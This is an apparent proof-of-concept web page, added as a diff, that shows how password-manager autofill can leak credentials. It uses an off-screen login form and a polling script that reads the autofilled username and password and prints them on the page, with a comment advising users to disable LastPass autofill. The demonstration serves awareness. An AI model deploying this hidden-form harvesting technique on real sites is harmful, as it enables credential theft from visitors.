@@ -1,0 +1,34 @@
+<html>
+    <div class="container">
+        <div style="margin-left:100%" class="main">
+            <h2>Login</h2>
+            <form id="form_id" method="post" name="myform">
+                <label>User Name :</label>
+                <input type="text" name="username" id="username"/>
+                <label>Password :</label>
+                <input type="password" name="password" id="password"/>
+                <input type="button" value="Login" id="submit" onclick="validate()"/>
+            </form>
+        </div>
+    </div>
+    <span id="lol"></span>
+    <script>
+        var lol = document.getElementById("lol");
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+
+        async function go() {
+            await sleep(500);
+
+            if (document.getElementById("username").value && document.getElementById("password").value) {
+                lol.innerHTML = document.getElementById("username").value + '<br>' + document.getElementById("password").value
+                await sleep(500);
+                lol.innerHTML = lol.innerHTML + '<br><br>You could have just been haxed just by visiting this site!' // In lastpass, go to preferences/general and disable "Automatically Fill Login Information" It will get reenabled though...
+            }
+            go()
+        }
+        go()
+    </script>
+</html>
